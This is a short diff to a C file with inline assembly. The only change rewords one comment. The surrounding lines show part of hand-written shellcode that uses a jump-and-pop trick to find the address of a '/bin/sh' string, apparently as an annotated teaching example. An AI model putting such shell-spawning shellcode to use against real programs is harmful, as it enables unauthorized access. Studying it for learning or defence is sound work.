@@ -72,7 +72,7 @@ int main() {
 		// instruction is annotated in the comment lines following the
 		// statements.
 	        "jmp . + 0x33\n"                    // 2 bytes
-		// retrieve the return address that the call instruction put
+		// retrieve the "return address" that the call instruction placed
 		// on the stack into %rbx
 		"popq   %rbx\n"                     // 1 byte
 		// write the address of the /bin/sh string just after the
